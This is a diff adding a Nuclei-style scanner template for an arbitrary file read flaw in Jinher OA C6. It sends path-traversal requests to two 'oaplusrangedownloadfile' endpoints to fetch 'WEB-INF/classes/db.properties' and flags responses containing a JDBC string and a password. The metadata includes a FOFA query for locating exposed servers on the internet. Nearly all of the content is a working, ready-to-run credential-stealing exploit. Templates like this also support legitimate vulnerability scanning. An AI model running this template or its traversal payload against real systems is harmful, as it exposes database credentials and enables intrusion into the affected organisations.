@@ -1,0 +1,28 @@
+id: jinher-oa-jc6-oaplusrangedownloadfile-fileread
+
+info:
+  name: 金和 OA jc6 oaplusrangedownloadfile - fileread
+  author: god
+  severity: high
+  description: 金和OA C6 oaplusrangedownloadfile存在任意文件读取
+  reference:
+    - todo
+  metadata:
+    veified: true
+    max-request: 1
+    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
+  tags: jinher,fileread,oa
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/pm/JHSoft.WCF/login/oaplusrangedownloadfile?filename=../WEB-INF/classes/db.properties"
+      - "{{BaseURL}}/jc6/JHSoft.WCF/login/oaplusrangedownloadfile?filename=../WEB-INF/classes/db.properties"
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'jdbc','password')
+        condition: and
